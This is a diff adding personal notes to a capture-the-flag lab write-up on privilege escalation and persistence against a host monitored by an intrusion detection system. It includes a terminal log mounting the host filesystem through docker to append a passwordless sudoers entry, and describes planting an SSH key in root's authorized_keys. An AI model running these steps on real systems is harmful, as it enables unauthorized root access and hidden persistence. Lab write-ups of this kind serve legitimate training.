@@ -136,6 +136,65 @@ We can use these capabilities to gain root privileges quite easily try and run t
 This will spawn a container in interactive mode, overwrite the default entry-point to give us a shell, and mount the hosts file system to root.  From within this container, we can then edit one of the following files to gain elevated privileges:
 
 - `/etc/group` We could add the `grafana-admin` account to the root group. Note, that this file is covered by the HIDS  
+	`sudo usermod -aG root username`
 - `/etc/sudoers` Editing this file would allow us to add the grafana-admin account to the sudoers list and thus, we would be able to run `sudo` to gain extra privileges. Again, this file is monitored by Wazuh.  In this case, we can perform this by running:  
    `echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers   `  
-- We could add a new user to the system and join the root group via `/etc/passwd` . Again though, this activity is likely to be noticed by the HIDS
+- We could add a new user to the system and join the root group via `/etc/passwd` . Again though, this activity is likely to be noticed by the HIDS.
+	`sudo usermod -aG admin johndoe`
+
+Q)Perform the privilege escalation and grab the flag in /root/
+```
+grafana-admin@reversegear:~$ pwd
+/home/grafana-admin
+grafana-admin@reversegear:~$ whoami
+grafana-admin      !!!
+grafana-admin@reversegear:~$ sudol -l
+
+Command 'sudol' not found, did you mean:
+
+  command 'sudo' from deb sudo (1.8.31-1ubuntu1.2)
+  command 'sudo' from deb sudo-ldap (1.8.31-1ubuntu1.2)
+
+Try: apt install <deb name>
+
+grafana-admin@reversegear:~$ sudo -l
+[sudo] password for grafana-admin: 
+Sorry, user grafana-admin may not run sudo on reversegear.
+grafana-admin@reversegear:~$ docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master    !!!!
+
+root@3b3df5d268cd:/# 
+root@3b3df5d268cd:/# whoami
+root     !!!!
+root@3b3df5d268cd:/# echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers          !!!
+root@3b3df5d268cd:/# whoami
+root     !!!
+root@3b3df5d268cd:/# ls
+bin   dev  home           lib    lib64   media  opt   root  sbin  sys  usr
+boot  etc  initctl_faker  lib32  libx32  mnt    proc  run   srv   tmp  var
+root@3b3df5d268cd:/# cd root
+root@3b3df5d268cd:~# lls
+bash: lls: command not found
+root@3b3df5d268cd:~# ls
+root@3b3df5d268cd:~# ls -l
+total 0
+root@3b3df5d268cd:~# cd ..
+root@3b3df5d268cd:/# cd home
+root@3b3df5d268cd:/home# ls
+root@3b3df5d268cd:/home# cd ..
+root@3b3df5d268cd:/# cd /mnt   !!!
+root@3b3df5d268cd:/mnt# ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
+root@3b3df5d268cd:/mnt# cd root   !!!
+root@3b3df5d268cd:/mnt/root# ls
+root.txt  snap
+root@3b3df5d268cd:/mnt/root#  cat root.txt  !!! 
+
+```
+
+## **Establishing Persistence**
+The compromised host is running Linux so we have a number of persistence mechanisms available to us. The first option which, is arguably the most straightforward is to add a public key that we control to the *authorized_keys* file at `/root/.ssh/`. This would allow us to connect to the host via SSH without needing to run the privilege escalation exploit every time and without relying on the password for the compromised account not changing. This methodology is very common among botnets as it's both reliable and very simple to implement as pretty much all Linux distributions indented for server use run an Open-SSH service by default.
+
+Try this now, a valid key pair can be generated for the attack box by running `ssh-keygen`. Once this key is added to the *authorized_keys* file in `/root/.ssh/` you should be able to gain remote access to root whenever it's needed, simple right? Well, unfortunately, this tactic has one big disadvantage as it is highly detectable.
+
+HIDS often feature some form of file system integrity monitoring service which, will periodically scan a list of target directories for changes with, an alert being raised every time a file is changed or added. By adding an entry to the `authorized_keys` file you would have triggered an alert of a fairly high severity and as a result, this might not be the best option. An alert is also raised every time an ssh connection is made so the HIDS operator will be notified every time we log on.
